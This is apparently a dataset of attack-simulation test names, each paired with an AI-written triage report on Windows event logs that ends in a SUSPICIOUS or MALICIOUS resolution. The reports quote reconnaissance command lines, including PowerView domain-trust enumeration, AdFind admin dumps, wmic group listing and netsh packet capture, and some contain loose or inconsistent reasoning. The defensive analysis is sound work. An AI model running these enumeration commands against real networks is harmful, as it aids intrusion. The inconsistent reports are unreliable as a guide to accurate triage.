   - Execution of a Python script (`data.py`) located in a temporary user directory with an IP address as an argument suggests potential remote connectivity attempts or data exfiltration processes in execution.

4. **Unusual Process Creations**:
   - `CompatTelRunner.exe` is executed with extended telemetry options. This unusual behavior warrants further investigation as it might have been tampered with to collect more data than usually allowed.

Overall, the combination of downloading and execution of external software, querying administrative and system-level accounts, and the PowerShell script execution reflects patterns associated with potentially malicious activities such as initial compromise, information gathering, and unauthorized software installation.

**Assessment**: 
- **Resolution**: **MALICIOUS**

**Guidance on how to proceed**:
- Immediately isolate and inspect the machine `Server002` to prevent any further unauthorized activity.
- Conduct a thorough investigation to identify if other systems in the network have witnessed similar activities.
- Review the integrity of `CompatTelRunner.exe` and `PowerShell` to ascertain they have not been altered or misconfigured.
- Analyze the network traffic during the identified window to detect any data exfiltration attempts.
- Conduct a security audit of user accounts and privileges, particularly focusing on accounts that may have been targeted or used during the identified suspicious activities.
- Implement monitoring to track the execution of PowerShell scripts, especially ones that download and execute software.
- Review and enhance endpoint protection settings to detect and respond to such activities in the future.
  
By following these steps, your organization can mitigate any damage done and enhance security posture against similar threats in the future."
Windows Internal Packet Capture,"### Detailed Analysis of the Windows Event Logs

#### Observations:

1. **Process Execution:**
    - Multiple instances of `wevtutil.exe` (Windows Events Utility) and `conhost.exe` (Console Host) are executed by the user `SERVER002\admin_test`. This pattern is repeated several times within a short period.
    - `HOSTNAME.EXE` and `whoami.exe` are also executed by the same user.
    - A command-line execution of `cmd.exe` is observed with the command: `""cmd.exe"" /c netsh trace start capture=yes tracefile=%%temp%%\\trace.etl maxsize=10`. This command is followed by the execution of `netsh.exe`, capturing network traffic, which is not typical for standard user activity and could indicate reconnaissance or troubleshooting by an admin.

2. **Unusual Behavior:**
    - The frequent invocation of `wevtutil.exe` and `conhost.exe` is not typical and could suggest either scripted activity or automated tasks being run.
    - The execution of commands that capture network traffic (`netsh trace`) might indicate monitoring or forensic activity. This behavior is suspicious when performed unexpectedly or without proper context.

3. **Time Manipulation:**
    - System time change events are detected in the system logs. This can be a significant indicator of malicious activity, especially if done to manipulate logs or alter time-bound security measures. It’s worth investigating who or what initiated these changes.

4. **Privilege Levels:**
    - Several processes are executed with ""High"" integrity levels, indicating elevated privileges. 
    - There is also at least one instance of a Service logon type (EventID 4624, LogonType 5), which is consistent with system-initiated or scheduled tasks.

5. **Event Correlation:**
    - Some process executions such as `whoami.exe` and `cmd.exe` are preceded by `wsmprovhost.exe`, indicative of potential scripting or remote management actions.

#### Assessment:

- **Suspicious Activity Detected**:
    - The combination of frequent executions of service management utilities (`wevtutil.exe`, `netsh.exe`), time manipulation, and high integrity levels across multiple command executions shifts this case towards needing further investigation.
    - Particularly, the execution of commands to start network tracing by an admin user without explicit organizational procedure approval suggests potential monitoring, unauthorized capture, or traffic analysis activity.

#### Recommendations:

1. **Review Administrative Actions**:
    - Verify if the actions align with any scheduled maintenance or administrative tasks.
    - Check if the user `SERVER002\admin_test` had any valid reason to execute such utilities and under what context.

2. **Investigate Time Changes**:
    - Verify the origins and justifications for the system time changes. Ensure they were not executed to bypass security measures.

3. **Monitor and Isolate if Necessary**:
    - Continue monitoring this host for any further suspicious behavior.
    - Depending on findings, consider isolating the machine for further forensic analysis.

4. **Access Logs and Scripts**:
    - Check for any scripts or cron jobs that might have triggered these processes.
    - See if there are logs or configured traces that were set up intentionally for audit purposes or inadvertently left by an administrator.

#### Resolution:

- **SUSPICIOUS**: Given the activities observed, particularly the network captures and potential time manipulation, the situation warrants further investigation to rule out or confirm malicious intent."
List Process Main Windows - C# .NET,"Analyzing the provided Windows event logs for the CEO's machine, there are several observations to be made regarding the potential indicators of compromise:

### Findings:

1. **Security Logs (EventID 5379):**
   - Multiple events with EventID 5379 indicate Credential Validation failures. These are attempts to retrieve credentials for a Microsoft Account or Windows Live ID. The `ReturnCode` of `3221226021` denotes a failure due to the user not being authenticated, which may be normal behavior if there were failed attempts to use a particular service or account on the workstation.
   
2. **System Logs:**
   - Events related to `WindowsUpdateClient` (EventIDs 43 and 44) show updates being applied, specifically an update for Microsoft Defender Antivirus. This activity appears routine and security-focused.

3. **Sysmon Logs:**
   - There are multiple instances of `C:\\Windows\\System32\\wevtutil.exe` and `C:\\Windows\\System32\\cmd.exe` being executed with high integrity and activities involving Visual C# Command Line Compiler (`csc.exe`) creating an executable `data.exe` in a temporary folder. 
   - This sequence of operations involving the compilation of code into an executable and subsequent execution, especially residing in the user’s TEMP directory, is a common technique used in malware execution. This could indicate potentially suspicious behavior.
   - The activity of `csc.exe` and `cvtres.exe` suggests that code was compiled and linked, potentially to execute unauthorized code.

4. **Microsoft Edge Installations:**
   - The logs show activities related to the update of Microsoft Edge, which is a normal operation, especially when updates are triggered via the Edge Update service. This doesn't directly indicate any suspicious activity.

5. **Indicators of Suspicious Execution:**
   - The usage of PowerShell and tools like `wevtutil.exe` to manipulate system logs might be innocuous but often indicates attempts to cover tracks or perform lateral movement within a compromised system if not part of standard administrative activity. 

6. **Compiled Executable Execution:**
   - The execution of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\data.exe`, particularly emanating from a compiled source in a temporary directory, is highly suspicious. The lack of a conventional software package or digital signature associated with this executable raises concerns about its origin and intent.

### Assessment:

Based on the analyzed logs, there appears to be activity that warrants further investigation. The compilation and execution of a temporary executable (`data.exe`) and the surrounding utilization of `wevtutil.exe` and `cmd.exe` suggest possible malicious activity.

### Resolution:

**SUSPICIOUS** - The event logs contain activities that appear unusual and might indicate malicious behavior. These include the creation and execution of a file from a temporary directory. Further investigation is necessary to confirm if these activities are part of a legitimate process or indicative of a security compromise.

### Guidance:

1. **Immediate Response:**
   - Isolate the CEO's machine from the network to prevent potential lateral movement by any executing malware.
   - Verify whether the suspicious file (`data.exe`) and the source code (`data.cs`) are related to legitimate activities or ongoing development/testing tasks. If not, these indicate a potential security incident.

2. **In-depth Investigation:**
   - Perform a forensic analysis of the system, focusing on the context of `data.exe` compilation and execution. Track changes and any outbound communications.
   - Search for the presence of known malicious signatures or IOCs related to the findings using updated security tools.

3. **Preventive Measures:**
   - Ensure that the organization’s EDR is configured properly to detect and alert on execution anomalies, especially around scripting and compiler activities.
   - Implement stricter policies around what can be executed and monitor critical endpoints more aggressively.

Further clarity will emerge once additional contextual investigation is conducted into the nature of the compiled executable and its source."
Powershell enumerate domains and forests,"Based on the analysis of the provided logs, several suspicious activities warrant further investigation, which potentially points to malicious activity. Below is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Privileged Account Activities:** 
   - Multiple ""4798"" events in the Security log list all groups the ""admin_test"" user is a member of, which may indicate reconnaissance activities by a privileged user.
   - The ""4624"" and ""4672"" events show logins and special privilege assignments to the ""SYSTEM"" user, often indicative of privilege escalation or unauthorized logins.

2. **Use of Commands Common in Reconnaissance or Attack Stages:**
   - **PowerShell Activity:** The Sysmon and PowerShell logs indicate PowerShell execution with scripts aimed at domain enumeration such as `Get-NetDomainTrust`, obtained from the ""PowerView"" script. PowerView is a post-exploitation tool commonly used for Active Directory enumeration. The command executed was:
     - `""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" & {Import-Module ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\PowerView.ps1"", Get-NetDomainTrust, Get-NetForestTrust,...}`

3. **Execution of Tools in Quick Succession:**
   - There is rapid execution of several system utilities (`whoami.exe`, `hostname.exe`, and `wevtutil.exe`) under the context of ""admin_test"", which could be indicative of a script or an attacker executing commands remotely.

4. **Suspicious Use of wevtutil.exe:**
   - Seen multiple times being executed by the user ""admin_test,"" this tool can be used to clear event logs, indicating potentially an attempt to cover tracks post-compromise.

5. **Unusual Process Activity:**
   - The frequent use of `conhost.exe` and `wevtutil.exe` by the non-standard user ""admin_test"" alongside the use of PowerShell may indicate an attempt to obfuscate activities.

### Assessment of the Situation:
The presence of PowerShell scripts known for network enumeration, the repeated querying of user group memberships, the rapid sequence of tool executions, and the use of potentially malicious third-party PowerShell scripts strongly indicate an unauthorized activity—potential reconnaissance, and privilege escalation attempts. This is particularly concerning given it's occurring on the CEO's machine, indicating a potential targeting of high-value accounts.

### Identified Risks:
- Unauthorized access and enumeration of network resources.
- Potential exfiltration or lateral movement within the network.
- Use of advanced tactics to escalate privileges and maintain persistence within the network.

### Guidance on How to Proceed:
1. **Immediate Response:**
   - Detect and isolate the affected system (Server002) from the network to contain the potential compromise.
   - Revoke credentials and access for the ""admin_test"" account and monitor for any further unauthorized attempts.

2. **Further Investigation:**
   - Retrace the login and execution trails for the ""admin_test"" and ""SYSTEM"" accounts to understand the scope and origin of compromise.
   - Conduct a comprehensive forensic analysis on the system to identify any additional backdoors or malicious artifacts.

3. **Implement Enhanced Monitoring:**
   - Enhance logging and monitoring, particularly for PowerShell activities and privileged account activities.
   - Deploy additional EDR solutions or rules specifically targeting known scripts and lateral movement tactics.

### Conclusion:
The activity observed in these logs is definitely indicative of malicious behavior. The execution of known attack tools and scripts, especially tied to reconnaissance and privilege escalation, necessitates expedited investigation and response.

**Resolution:** MALICIOUS"
Adfind - Enumerate Active Directory Subnet Objects,"### Log Analysis

Upon reviewing the Windows event logs provided, the following observations have been made:

#### Application Log
- The Application log shows multiple entries indicating that Windows Defender is in the `SECURITY_PRODUCT_STATE_ON` state. This suggests that Windows Defender is active and operational, which is a standard security posture.

#### Sysmon Log
1. **Process Creation Events:**
   - Legitimate processes related to Windows Update (`wuauclt.exe`), Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`), AntiMalware updates (`AM_Delta.exe`), and other system processes have been logged. The presence of these processes aligns with typical system activities.
   - **PowerShell and Wevtutil Executions:**
     - The execution of `powershell.exe` and `wevtutil.exe` by the user `SERVER002\admin_test` is worth noting. PowerShell and Wevtutil are powerful tools often used for legitimate administrative tasks. However, they can also be misused by attackers for process automation and event log management, respectively.
   - **AdFind.exe Execution:**
     - The presence of `AdFind.exe`, executed from the `Temp` directory, is a potential area of concern. AdFind is a legitimate tool often used for directory queries but can be utilized by attackers for reconnaissance within an Active Directory environment.

2. **Miscellaneous Processes:**
   - Other system processes like `sc.exe`, `cmd.exe`, `conhost.exe`, and various system management utilities are seen executing, which are standard parts of Windows operation.

#### Security Log
- The security logs show standard audit entries such as logon events (`4624`) and special privilege logons (`4672`), which suggest regular maintenance processes. The `LogonType` 5 indicates a service logon, which is typical for background operations.
- Credential operation failures (`5379`) indicate attempts to access or manipulate credentials, possibly by system processes trying to authenticate with the Microsoft account service. The return code `3221226021` signifies a failure but not necessarily malicious.

### Assessment
- **Benign Activities:** Most of the log activities, such as system and application updates, are typical system operations for maintaining software and security patches.
- **Potential Suspicious Activities:**
  - The execution of `AdFind.exe` from the `Temp` directory, combined with PowerShell and Wevtutil operations, can suggest suspicious behavior particularly if these activities are not part of routine administrative tasks.
  - These events suggest potential reconnaissance or preparation stages of a broader attack, especially if they occur without context, such as systems administration.

### Recommendation
- Conduct further investigation into the user `SERVER002\admin_test` to verify if these actions were authorized and part of regular administrative duties. Check for any deviation from regular patterns or unauthorized access at this account.
- Examine the context and origin of `AdFind.exe` usage more closely to determine if this installation and execution were authorized and necessary.
- Ensure auditing is in place for PowerShell and logged events, especially those related to utility usage like Wevtutil.
- Depending on the findings, enhanced monitoring and possibly further forensic analysis may be warranted to confirm or dismiss potential malicious activity.

### Conclusion
- **Resolution:** **SUSPICIOUS** – These logs contain activities that appear atypical and warrant further investigation to rule out any malicious intent or unauthorized activity."
Wmic Group Discovery,"Upon analyzing the provided Windows event logs, the following observations have been made:

1. **Frequent Execution of Hostname and Whoami:**
   - The `hostname.exe` and `whoami.exe` processes are run multiple times in quick succession. While these are legitimate Windows binaries, frequent execution in a short period could suggest reconnaissance activity, potentially indicative of a script or test being run.
   
2. **Use of WMIC:**
   - There is the execution of `cmd.exe` with the command `wmic group get name` which is a WMI command. WMI can be frequently used for management but is also commonly leveraged by attackers for information gathering and lateral movement due to its ability to interact with remote systems.
   
3. **Multiple wevtutil Executions:**
   - There are multiple executions of `wevtutil.exe`, which is a command-line utility used to retrieve information about event logs and publishers. While it can be used for legitimate administrative purposes, its execution, especially when frequent or automated, can be suspicious as attackers use it to clear or manage event logs to cover traces.

4. **Integrity Level and User Context:**
   - All suspicious activities (hostname, whoami, wmic, wevtutil) are executed within a high integrity level and within the context of a user `SERVER002\\admin_test`. This suggests that activities are being performed with elevated privileges, but it is normally expected in an administrative context.

5. **Time Change Events:**
   - There are repeated records indicating a time change. Unexpected or unauthorized time changes can cause difficulties in log analysis and can be an attempt to evade detection. In this case, it appears system time was adjusted to synchronize with an NTP server, which may be benign.

### Assessment:

- **Frequent Execution of Network and User Info Commands:** The repeated execution of commands like `hostname.exe`, `whoami.exe`, and WMI commands, in quick succession, is unusual and suggests potential reconnaissance activity.
- **Use of wevtutil:** Frequent executions without a clear administrative purpose could indicate an attempt to manipulate, gather, or clear logs.
- **Potential Privilege Misuse:** Actions run under a high-integrity context by an admin-level user could be legitimate administrative activities, but frequent and suspicious execution patterns are a cause for concern.

### Conclusion:

**Resolution: SUSPICIOUS**

The activities observed in the logs are suspicious due to the nature and frequency of the commands executed and the potential misuse of administrative privileges. Further investigation is needed to determine the intent and context:
- **Review administrative scripts or crons** on the system to determine if the observed behavior is part of an expected operational process.
- **Check with the system administrator** of `SERVER002` to confirm if these activities were expected and authorized.
- **Conduct a thorough review for signs of compromise,** including looking for abnormal network traffic, additional unauthorized changes, and potentially scanning the system for known indicators of compromise.

If no legitimate reasons are found for these activities, a deeper forensic investigation may be required to confirm the presence of any compromise."
Remote System Discovery - ping sweep,"Based on the provided Windows event logs, here is a detailed analysis:

### Suspicious Activity

1. **PowerShell Execution**: 
   - **Command Execution**: There are PowerShell commands executed with restricted execution policy using `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';` and `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;`. These commands are fairly innocuous but could potentially be used to execute more harmful commands if they're modified.
   - **Execution Context**: The commands are executed by the `SYSTEM` user, which is a typical behavior for automated or scheduled tasks, but it is worth noting given the context of investigating the CEO's machine.

2. **Sysmon Logs**:
   - **Massive PING Activity**: There is a repeated sequence of `ping` commands executed against a large range of IP addresses. This could indicate network scanning or a poorly constructed batch operation for network analysis. Since this action is executed under the `admin_test` user account, it raises red flags for network reconnaissance or lateral movement attempts.
   - **Whoami and Hostname Commands**: Commands like `whoami` and `hostname` are standard but could be indicative of information gathering by a malicious operator seeking to understand their environment.

3. **Security Logs**:
   - **Privileged Logon**: The security log contains events indicating a successful logon for the `SYSTEM` and `admin_test` accounts with elevated privileges. The presence of these accounts conducting operations needs more context to ascertain if it’s as expected or anomalous, especially considering the potential for privilege escalation.

### Assessment & Threat Analysis

- **Network Reconnaissance**: The ping sweep might indicate potential reconnaissance activity. This warrants further investigation, especially to confirm if this activity was executed on purpose for administrative tasks or if it was unauthorized.
- **Privileged Commands**: The PowerShell commands running under system privileges should be reviewed to establish whether such behavior is standard practice on this machine, considering that misconfigurations or unauthorized scripts could be exploited.

### Resolution: SUSPICIOUS

The logs contain activities that could be indicative of malicious actions but lack concrete evidence of compromise. The presence of extensive network probing and PowerShell commands in automated processes suggests abnormal behavior that warrants a deeper investigation.

### Guidance on How to Proceed

1. **Conduct Endpoint Review**:
   - Check for any scheduled tasks, scripts, or software that might explain these PowerShell commands and network scanning.
   - Investigate the `admin_test` account activities to ascertain its legitimacy and validate intended operations.

2. **Network Monitoring**:
   - Review network traffic logs corresponding to the ping commands to identify if attempts were made to reach external or previously unknown internal IP addresses.

3. **Audit Privileged Operations**:
   - Verify all recent privileged operations and ascertain their legitimacy. Look for changes in the security baseline for the `SYSTEM` and `admin_test` accounts.

4. **Containment and Hardening**:
   - If unauthorized activities are detected, restrict and contain the affected accounts, enhance monitoring, and apply additional security controls.

By advancing these steps, you should determine whether the activity is related to routine operations or a precursor to more severe security events."
Windows Internal pktmon set filter,"Upon reviewing the provided Windows event logs, several observations arise that could suggest suspicious activity, although they do not definitively indicate a compromise. Here's a detailed analysis:

### Observations:
1. **Frequent Use of `wevtutil` and `conhost`**:
   - There are repeated events involving `wevtutil.exe` and `conhost.exe` under the user `SERVER002\\admin_test`. This can sometimes indicate log manipulation attempts or process augmentations. 
   - `wevtutil` is often used for accessing and clearing event logs, which can be common in both administrative tasks and malicious activities seeking to cover tracks.

2. **Execution of `whoami.exe` and `hostname.exe`**:
   - These commands are typically used to gather information about the system environment. While not inherently malicious, they could be utilized as part of an enumeration phase by an attacker.
   - The command line execution context for these commands shows `wsmprovhost.exe` as a parent process, which is associated with Windows Remote Management (WinRM). This could suggest remote command execution, though it might also be legitimate administrative activity.

3. **Execution of `cmd.exe` with `pktmon` Command**:
   - `cmd.exe` runs `pktmon.exe` to add a packet filter for port 445. This action is unusual for standard operations and might suggest an attempt to monitor or manipulate network traffic, particularly associated with SMB traffic over port 445.
   - The parent process is again `wsmprovhost.exe`, reinforcing the potential use of remote administrative or possibly unauthorized access.

4. **System Time Manipulation**:
   - There are entries showing that the system time was adjusted backward. This is a common tactic used by attackers to confuse log timelines, potentially hindering forensic investigations.

### Conclusion:
Based on the logs:
- **The activity observed could align with normal administrative tasks**, especially if the user `SERVER002\\admin_test` has been performing system maintenance or diagnostics.
- **However, the combination and frequency of commands, particularly involving network monitoring tools like `pktmon` and system time manipulation, is atypical** and could suggest suspicious intent or preparation for a more focused attack.

### Final Assessment:
**Resolution: SUSPICIOUS**

### Recommendations:
- Thoroughly investigate the user's recent behavior and administrative tasks to confirm if these actions were planned and are legitimate.
- Check for any linked alerts or detection insights from other security tools that might corroborate potential malicious behavior.
- Analyze network logs and file changes around the same timeframe to detect any lateral movement or data exfiltration attempts.
- Review and, if necessary, enhance logging and monitoring policies to detect similar patterns in real-time.
- If unauthorized use is suspected, consider isolating the system and conducting a full forensic analysis to uncover any extent of compromise."
Discover System Language with dism.exe,"Based on the provided log entries, let's analyze them step-by-step to identify any suspicious or anomalous behavior indicating potential malicious activity:

1. **Time Discrepancies and Synchronization:**
   - System logs show multiple events related to time changes using `svchost.exe`, which is a legitimate Windows service host process. However, frequent time changes could be a method attackers use to manipulate time stamps and confuse analysis.
   - The time service event indicates synchronization with `time.windows.com`, which is a standard time source for Windows systems and looks benign.

2. **Security Log Analysis:**
   - The security logs show a sequence of logon events with Event IDs 4624 (successful logon) and 4634 (logoff), featuring the `admin_test` account.
   - Event ID 4672 indicates special privileges assigned to the `admin_test` account. The set of privileges includes `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which can be used for privilege escalation or code injection. This is suspicious, especially for an account that might be testing administrative tasks.
   - A notable logon using NTLM authentication suggests possible remote access or an account monitoring method. The use of NTLM over more secure protocols like Kerberos could be indicative of an older system that could be more vulnerable.

3. **Sysmon and Application Log Analysis:**
   - Sysmon logs display the execution of several system utilities like `wevtutil.exe`, `whoami.exe`, and `cmd.exe`, which are often utilized to gather system information or execute scripts. While their presence is not inherently malicious, such tools are frequently abused during malicious activity.
   - We see execution of `cmd.exe` used to call `dism.exe` with arguments `/online /Get-Intl`, which is used to get international settings. This activity can be seen during normal administration as well as in malicious scenarios where attackers gather system locale info.
   - There are numerous events related to Microsoft Edge updating processes; these appear legitimate based on paths and descriptions and likely related to Edge performing its regular updates.
   - The presence of `sppsvc.exe` (Software Protection Platform service) is normal and expected on Windows systems for software licensing purposes.

4. **Assessment:**
   - The cumulative logs do not clearly indicate a definite malicious action but contain potentially suspicious activities like the manipulation of system time, the granting of extensive admin privileges, particularly `SeDebugPrivilege`, and the use of administrative commands without clear justification.

5. **Resolution:**
   - Based on the logs provided, the presence of privileged operations and legitimate tools used can be warranted in controlled environments but also matches patterns seen in post-exploitation where attackers seek to gather info and maintain persistence.
   - Given the current evidence and the need for further investigative context (such as why `admin_test` has these privileges or specific reasons behind running administrative commands), the resolution is:

**SUSPICIOUS** - The logs contain activities that don't look entirely right and necessitate more investigation to confirm if they're benign or malicious. Further investigation should include user intent verification, broader context of the execution events, network traffic analysis, and review of security policy settings related to user `admin_test`."
Adfind - Enumerate Active Directory Admins,"**Analysis of Windows Event Logs:**

1. **Overview of Events:**

2. **Suspicious Activity Identified:**
   - **AdFind.exe Execution:** This tool (`AdFind.exe`) executed via a command line (`""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -sc admincountdmp`) is a known utility used for querying Active Directory. Its presence could indicate reconnaissance actions aimed at gathering information about user accounts, potentially seeking accounts with elevated privileges.
   - **Use of `wevtutil.exe`:** This utility is commonly used to query or modify event logs. Its repeated execution (`wevtutil.exe`) could imply an attempt to clear logs or gather specific log information, which can be indicative of attackers attempting to cover their tracks.
   - **Command and Shell Usage:** The frequent invocation of `cmd.exe` alongside utilities like `whoami.exe` signifies potential attempts at privilege verification and shell interaction. The combination of these processes might suggest reconnaissance or preparation for lateral movement.
   
3. **Normal Activity:**
   - Processes such as `TiWorker.exe`, `TrustedInstaller.exe`, `SecurityHealthService.exe`, and system maintenance tasks performed by `taskhostw.exe` and `wermgr.exe` are associated with regular Windows operations and maintenance.
   - Windows Defender is active and running, evidenced by state change logs confirming its enabled status.

4. **Security Log Review:**
   - Login and Special Privileges: Event ID 4624 and 4672 for SYSTEM account logon show special privileges being assigned. While not inherently malicious, monitoring for non-standard SYSTEM logon activities is advised in combination with other suspicious actions.

**Assessment and Resolution:**

Based on the analysis, the events show signs of potentially suspicious activity that need to be investigated further, particularly concerning the use of AdFind and wevtutil utilities under user ""SERVER002\\admin_test"". The context—usage patterns, timing, and typical behavior of this account—can help ascertain intent and risk.

**Threats/Risks Identified:**
- Potential reconnaissance using AdFind can signal preparation for a privilege escalation or data exfiltration attack.
- Use of wevtutil might attempt log manipulation for covering tracks.

- **Review Logs and User Activity:** Analyze prior and subsequent log files for corroborative events surrounding these activities. Verify if the use of elevated permissions aligns with legitimate administrative tasks or outstanding alerts.
- **Containment and Monitoring:** If unauthorized, consider isolating affected credentials/systems, and track any further unexplained activity or data access attempts.
- **Enhance Security Measures:** Implement tighter controls on command-line tools usage and increase monitoring of high-value assets like accounts with administrative permissions.

**Resolution:** **SUSPICIOUS** - The activity warrants further investigation to confirm if it represents harmless administrative tasks or unauthorized reconnaissance efforts, especially around the usage of AdFind and manipulation of Microsoft utilities by the user."
Remote System Discovery - adidnsdump,"Upon reviewing the provided Windows event logs, the following key observations and potential indicators of suspicious or malicious activity were identified:

1. **Unusual PowerShell Usage:**
   - PowerShell was used to download a Python executable from the internet and execute it with arguments to quietly install Python while suppressing error messages. This is suspicious because it directly downloads and launches an executable without user interaction or verification.
   
2. **Unauthorized Software Installation:**
   - Multiple instances of Python-related executables were observed, such as `python.exe` and `python_setup.exe`, along with `pip` installations through `msiexec`. While Python installation might be legitimate, the method of installation (via PowerShell download and execution in a Temp directory) raises concerns about unauthorized or shadow IT actions.

3. **Command Execution:**
   - The use of `cmd.exe` to invoke a script (`adidnsdump`) located in a temporary folder with domain credentials hints at potential lateral movement or reconnaissance activity within the network. This could be indicative of an attacker attempting to extract DNS information from the network.

4. **Multiple Process Creations by PowerShell and cmd.exe:**
   - There is significant activity originating from PowerShell and `cmd.exe`, with several child processes created, which may imply attempts to execute scripts or commands stealthily.

5. **Security Events:**
   - Privilege escalation for SYSTEM user with high privileges (Event ID 4672) is standard for system processes, but in the context of potentially malicious PowerShell and Python activity, it is important to examine if this was leveraged for executing unauthorized tasks.

6. **Task Scheduler-like Behavior:**
   - Execution of tasks such as updating software components and scheduled telemetry runs without clear scheduling or administrative approval could mirror patterns used by malicious actors to evade detection by integrating with system-level operations.

### Assessment and Conclusion

Based on the observed activity—particularly the unauthorized PowerShell script to download and silently install Python, coupled with the suspicious use of domain credentials in temporary scripts—there are strong indicators of potentially malicious activity. These actions suggest the possibility of an internal compromise with unauthorized software installations and attempts to probe and possibly extract sensitive network information.

### Resolution

**Resolution: MALICIOUS**
- The logs contain activities strongly indicative of malicious intent, possibly pointing to unauthorized access and potential data exfiltration attempts.

### Recommended Actions

1. **Immediate Containment:**
   - Isolate the affected machine from the network to prevent any further potential data leakage or lateral movement.

2. **Forensic Analysis:**
   - Conduct a thorough forensic analysis to identify any additional signs of compromise, including retrieving and sandboxing the downloaded Python installer for further inspection.

3. **User Verification:**
   - Verify the actions of the `SERVER002\\admin_test` user to determine if the activities were authorized or if the account may have been compromised.

4. **Network Monitoring:**
   - Increase monitoring of network traffic to detect any unusual communication patterns or access to critical network infrastructure services.

5. **Policy Review:**
   - Review and enforce endpoint security policies to limit unauthorized script execution, particularly focusing on PowerShell restrictions and software installation permissions.

By taking these steps, further malicious activity can be mitigated, and potential vulnerabilities within the organization's security posture can be addressed."
List Windows Firewall Rules,"### Analysis of Windows Event Logs

The logs provide various events related to process creation, execution, and system updates. Here's a detailed analysis of these entries focusing on potential indicators of malicious activity:

#### Sysmon Logs Analysis

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - We observe repeated executions of `wevtutil.exe` and `conhost.exe`. The `wevtutil` command-line utility is typically used for managing Windows event logs. While legitimate, frequent and consecutive executions could suggest log tampering or analysis attempts.
   - `conhost.exe` is a required shell process that must run to connect the command line with the Windows desktop. However, its repeated invocation without the accompanying parent process detail in some entries needs attention.

2. **Usage of Utilities like `hostname.exe`, `whoami.exe`, `cmd.exe`**:
   - Execution of network and system information commands such as `hostname.exe` and `whoami.exe` might indicate either a legitimate system inventory operation or an adversary gathering information.
   - The command `cmd.exe /c netsh advfirewall firewall show rule name=all` shows an attempt to view the firewall configuration, which could be benign but might also suggest malicious reconnaissance.

3. **Process Execution by NT AUTHORITY\SYSTEM**:
   - Several processes like `wuauclt.exe` (Windows Update), `AM_Delta.exe` (AntiMalware update), and `MpSigStub.exe` (signature update) are executed by NT AUTHORITY\SYSTEM, indicating system-level operations, likely related to scheduled updates and should be verified against the patch timeline.

#### Application and Security Logs Analysis

- **Security Intelligence Update for Microsoft Defender Antivirus**:
  - Logged system update related to security intelligence updates is consistent with regular system maintenance and not usually malicious unless tampered with.

- **Windows Security Auditing Logs**:
  - Events related to Microsoft Account credentials are incomplete or fail as indicated by `ReturnCode: 3221226021`. These entries are notable, though they could result from normal account verification failures or attempts.

### Threat Assessment

Overall, while specific benign activities (e.g., system updates and security updates) align with standard operations, the sequence of some commands and their purpose can raise questions in the wrong context:
- **Frequent utility executions** such as `wevtutil`, `netsh` and `cmd` operations, especially querying firewall rules, can point towards suspicious activities worthy of deeper inspection.
- **Credential events with incomplete data** could suggest additional verification is needed.

### Guidance

1. **Further investigation** is recommended:
   - **Validate user activity**: Confirm whether the `admin_test` user's operations are legitimate and authorized.
   - **Check firewall logs**: Correlate the `netsh` command execution with network traffic for unauthorized access.
   - **Review updates**: Ensure that the updates logged are expected for this period and not altered by malicious actors.

2. **Monitor and review** anomalous patterns for additional context:
   - Establish a pattern of typical usage for processes invoked.
   - If applicable, deploy additional endpoint monitoring.

### Conclusion

Given the context and observed logs, classify the findings as **SUSPICIOUS**. More investigation and corroborating evidence are required to conclusively identify the presence of malicious activities."
Win32_PnPEntity Hardware Inventory,"Upon analyzing the provided Windows event logs, several observations can be made. Here is a detailed assessment of the logs provided:

### Analysis

**Suspicious Behavior:**

1. **Unusual Powershell Activity:**
   - A Powershell command was run using `Get-WMIObject Win32_PnPEntity` which collects information related to device drivers and their providers (`CommandLine: ""powershell.exe"" & {Get-WMIObject Win32_PnPEntity | Format-Table...}`).
   - Data was being read, sorted, and written to a file in the TEMP directory (`$env:TEMP\data_collection.txt`). This is a common technique used for reconnaissance to gather system information.

2. **Frequent Conhost.exe Executions:**
   - `conhost.exe` processes are seen frequently being spawned, often used to run command-line operations. While not inherently suspicious, any unusual patterns or excessive spawning can indicate malicious activity.

3. **Wevtutil.exe Usage:** 
   - `wevtutil` is used for managing event logs and, in some malicious scenarios, clearing them to cover tracks. Its appearance without clear corresponding administrator tasks can seem suspicious.

**Benign Activity:**

1. **Microsoft Edge and System Processes:**
   - Processes such as `MicrosoftEdgeUpdate.exe`, `svchost.exe`, and other system-related processes (`sppsvc.exe`, `wsmprovhost.exe`) are noted, which are typical and expected in a Windows environment.

2. **Log Time Adjustment:**
   - Time adjustments were made via the `svchost.exe` process, commonly associated with time synchronization services, aligning with standard operations when time deviations are corrected through NTP services (e.g., `time.windows.com`).

**Indicators of Compromise:**

- The primary indicator of concern is the PowerShell script execution which aligns with behaviors used in reconnaissance phases of more sophisticated attacks.
- The use of `wevtutil.exe` without clear administrative context or purpose warrants further investigation to understand its intent.

### Assessment

After reviewing the logs, the activity appears suspicious, primarily due to the presence and operations of PowerShell and the usage of `wevtutil.exe` without a clear administrative task context. Although no definitive proof of malicious intent is observed (e.g., no persistence mechanisms, file modification, or evidence of payload execution), the activity aligns with potential reconnaissance or preparation stages of an attack.

### Resolution

**SUSPICIOUS** - The logs reflect behaviors that warrant further investigation. The presence of reconnaissance-like behavior and event management utility usages necessitate further examination to understand the context and intent.

### Recommendations to Proceed:

1. **Further Monitor and Traceback Powershell Activity:**
   - Identify any user or processes linked to launching such scripts and evaluate the necessity and authenticity of these operations.

2. **Examine Historical Context:**
   - Review previous and subsequent logs to understand if this behavior is consistent or anomalous.

3. **User and Process Verification:**
   - Verify the user `SERVER002\admin_test` to confirm it's a legitimate account and check for any signs of compromise. 

4. **Correlation with Threat Intelligence:**
   - Cross-reference the SHA256 hashes of the processes with known malicious hash databases, to rule out trojan or other malware impersonations.

5. **Assess System Changes:**
